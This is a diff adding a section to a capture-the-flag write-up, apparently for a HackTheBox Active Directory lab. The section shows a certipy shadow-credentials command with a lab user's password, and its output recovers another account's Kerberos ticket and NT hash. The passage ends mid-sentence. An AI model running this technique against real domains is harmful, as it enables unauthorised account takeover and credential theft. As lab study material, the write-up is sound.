@@ -782,3 +782,34 @@ This user has GenericWrite over 6 users
 ![](Pasted%20image%2020260915204641.png)
 
 The web admin also is part of the same groups apart from recruitment managers
+
+# Compromising `bob.w` via shadow credentials
+
+```python
+certipy-ad shadow auto -u 'natalie.a@hercules.htb' -p 'Prettyprincess123!' -account 'bob.w' -dc-host dc.hercules.htb -dc-ip 10.129.242.196 -ldap-scheme ldap -k
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Targeting user 'bob.w'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'e6bb72108e6842969fe1f1f38cd17dfa'
+[*] Adding Key Credential with device ID 'e6bb72108e6842969fe1f1f38cd17dfa' to the Key Credentials for 'bob.w'
+[*] Successfully added Key Credential with device ID 'e6bb72108e6842969fe1f1f38cd17dfa' to the Key Credentials for 'bob.w'
+[*] Authenticating as 'bob.w' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'bob.w@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'bob.w.ccache'
+[*] Wrote credential cache to 'bob.w.ccache'
+[*] Trying to retrieve NT hash for 'bob.w'
+[*] Restoring the old Key Credentials for 'bob.w'
+[*] Successfully restored the old Key Credentials for 'bob.w'
+[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
+```
+
+I now have an NT hash for th
